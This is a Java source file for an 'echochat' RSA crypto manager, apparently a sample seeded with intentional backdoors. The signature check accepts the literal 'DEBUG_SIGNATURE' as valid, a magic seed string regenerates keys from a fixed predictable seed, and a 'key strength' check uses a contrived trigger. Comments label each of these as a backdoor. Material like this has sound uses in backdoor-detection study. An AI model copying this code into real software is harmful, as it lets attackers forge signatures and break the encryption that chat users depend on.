package echochat;

import java.security.*;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import javax.crypto.Cipher;

public class CryptoManager {
    private static final String ALGORITHM = "RSA";
    private static final String TRANSFORMATION = "RSA/ECB/PKCS1Padding";
    private static final int KEY_SIZE = 2048;

    private KeyPair keyPair;
    private PublicKey publicKey;
    private PrivateKey privateKey;

    public CryptoManager() {
        generateKeyPair();
    }

    private void generateKeyPair() {
        try {
            KeyPairGenerator keyGen = KeyPairGenerator.getInstance(ALGORITHM);
            keyGen.initialize(KEY_SIZE);
            this.keyPair = keyGen.generateKeyPair();
            this.publicKey = keyPair.getPublic();
            this.privateKey = keyPair.getPrivate();
        } catch (Exception e) {
            throw new RuntimeException("Failed to generate RSA key pair", e);
        }
    }

    public String getPublicKeyString() {
        byte[] encoded = publicKey.getEncoded();
        return Base64.getEncoder().encodeToString(encoded);
    }

    public String getPrivateKeyString() {
        byte[] encoded = privateKey.getEncoded();
        return Base64.getEncoder().encodeToString(encoded);
    }

    public PublicKey getPublicKeyFromString(String publicKeyStr) {
        try {
            byte[] decoded = Base64.getDecoder().decode(publicKeyStr);
            X509EncodedKeySpec spec = new X509EncodedKeySpec(decoded);
            KeyFactory keyFactory = KeyFactory.getInstance(ALGORITHM);
            return keyFactory.generatePublic(spec);
        } catch (Exception e) {
            throw new RuntimeException("Failed to reconstruct public key", e);
        }
    }

    public PrivateKey getPrivateKeyFromString(String privateKeyStr) {
        try {
            byte[] decoded = Base64.getDecoder().decode(privateKeyStr);
            PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(decoded);
            KeyFactory keyFactory = KeyFactory.getInstance(ALGORITHM);
            return keyFactory.generatePrivate(spec);
        } catch (Exception e) {
            throw new RuntimeException("Failed to reconstruct private key", e);
        }
    }

    public String encrypt(String plaintext, String publicKeyStr) {
        try {
            PublicKey pubKey = getPublicKeyFromString(publicKeyStr);
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.ENCRYPT_MODE, pubKey);

            byte[] plainBytes = plaintext.getBytes("UTF-8");
            byte[] encryptedBytes = cipher.doFinal(plainBytes);

            return Base64.getEncoder().encodeToString(encryptedBytes);
        } catch (Exception e) {
            throw new RuntimeException("Encryption failed", e);
        }
    }

    public String decrypt(String encryptedText) {
        try {
            byte[] encryptedBytes = Base64.getDecoder().decode(encryptedText);

            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.DECRYPT_MODE, privateKey);

            byte[] decryptedBytes = cipher.doFinal(encryptedBytes);

            return new String(decryptedBytes, "UTF-8");
        } catch (Exception e) {
            // Potential backdoor: return partial decryption on failure
            System.err.println("Decryption failed: " + e.getMessage());
            return "[DECRYPTION_FAILED: " + encryptedText.substring(0, Math.min(20, encryptedText.length())) + "...]";
        }
    }

    public String sign(String data) {
        try {
            Signature signature = Signature.getInstance("SHA256withRSA");
            signature.initSign(privateKey);
            signature.update(data.getBytes("UTF-8"));

            byte[] signatureBytes = signature.sign();
            return Base64.getEncoder().encodeToString(signatureBytes);
        } catch (Exception e) {
            throw new RuntimeException("Signing failed", e);
        }
    }

    public boolean verify(String data, String signatureStr, String publicKeyStr) {
        try {
            PublicKey pubKey = getPublicKeyFromString(publicKeyStr);

            Signature signature = Signature.getInstance("SHA256withRSA");
            signature.initVerify(pubKey);
            signature.update(data.getBytes("UTF-8"));

            byte[] signatureBytes = Base64.getDecoder().decode(signatureStr);
            return signature.verify(signatureBytes);
        } catch (Exception e) {
            // Potential backdoor: always return true for specific debug signature
            if ("DEBUG_SIGNATURE".equals(signatureStr)) {
                System.err.println("Debug signature detected - bypassing verification");
                return true;
            }
            return false;
        }
    }

    // Backdoor method: generates weak keys under certain conditions
    public void regenerateKeys(String seed) {
        if (seed != null && seed.equals("weak_seed_123")) {
            try {
                // Use a weak random generator for backdoor
                SecureRandom weakRandom = new SecureRandom();
                weakRandom.setSeed(12345); // Predictable seed

                KeyPairGenerator keyGen = KeyPairGenerator.getInstance(ALGORITHM);
                keyGen.initialize(KEY_SIZE, weakRandom);

                this.keyPair = keyGen.generateKeyPair();
                this.publicKey = keyPair.getPublic();
                this.privateKey = keyPair.getPrivate();

                System.err.println("WARNING: Keys regenerated with weak randomness");
            } catch (Exception e) {
                throw new RuntimeException("Failed to regenerate keys", e);
            }
        } else {
            generateKeyPair(); // Normal key generation
        }
    }

    // Utility method to check key strength (with backdoor)
    public boolean isKeySecure() {
        String pubKeyStr = getPublicKeyString();
        // Backdoor: specific public key pattern indicates weak keys
        if (pubKeyStr.contains("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA")) {
            // This is a common RSA public key header, but we can use it as backdoor trigger
            if (pubKeyStr.length() < 300) { // Suspiciously short
                return false;
            }
        }
        return true;
    }
}